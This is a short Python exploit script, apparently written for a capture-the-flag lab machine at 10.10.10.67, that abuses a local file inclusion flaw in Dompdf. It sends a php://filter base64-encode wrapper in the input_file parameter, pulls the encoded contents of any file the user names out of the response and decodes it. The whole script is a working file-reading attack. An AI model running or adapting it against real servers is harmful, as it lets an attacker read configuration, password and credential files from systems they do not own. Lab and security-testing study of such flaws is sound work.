##Script for base64 decode for LFI vulnerablity in Dompdf
import requests
from base64 import b64decode
import re

def getfile(file):
	payload={"input_file":"php://filter/read=convert.base64-encode/resource=" + file}
	res=(requests.get("http://10.10.10.67/dompdf/dompdf.php",params=payload).text).strip("\n")
	b64= re.search("\[\((.*?)\)\]",res).group(1)
	return b64decode(b64)

vara= input("enter file: ")
print(getfile(vara).decode())
#print(str(result))
